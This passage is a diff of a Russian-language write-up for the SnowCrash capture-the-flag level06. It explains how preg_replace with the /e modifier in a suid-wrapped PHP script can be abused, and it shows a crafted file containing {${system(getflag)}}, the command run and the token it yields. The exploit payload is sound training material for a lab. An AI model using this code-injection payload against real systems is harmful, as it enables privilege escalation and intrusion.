@@ -13,7 +13,8 @@ $r = x($argv[1], $argv[2]); print $r;
 ?>
 Двоичный файл level06 снова имеет этот бит suid, который позволяет выполнять как флаг06 владельца root. Изучив его со строками и небольшим количеством gdb, мы видим, что он использует execve для вызова нашего скрипта с помощью argv[1] и argv[2]. php-скрипт вызывает file_get_contents с первым аргументом и выполняет некоторые замены регулярных выражений
 
-Важно то, что preg_replace с модификатором /e значит это будет выполнено с правами flag06
+Важно то, что preg_replace с модификатором /e значит он будет выполнен с правами flag06
+По сути, он заменит все [x ELEMENTS] на y («ELEMENTS») после экранирования захваченных элементов. В php вы можете интерполировать переменные, используя синтаксис {$ {. Таким образом, мы можем выполнить любой php-код, который мы хотим внутри интерполяции, например:
 
 level06@SnowCrash:~$ cat > /tmp/viewflag << EOF
 > [x {\${system(getflag)}}]
@@ -22,4 +23,3 @@ level06@SnowCrash:~$ ./level06 /tmp/viewflag
 PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
 Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
-
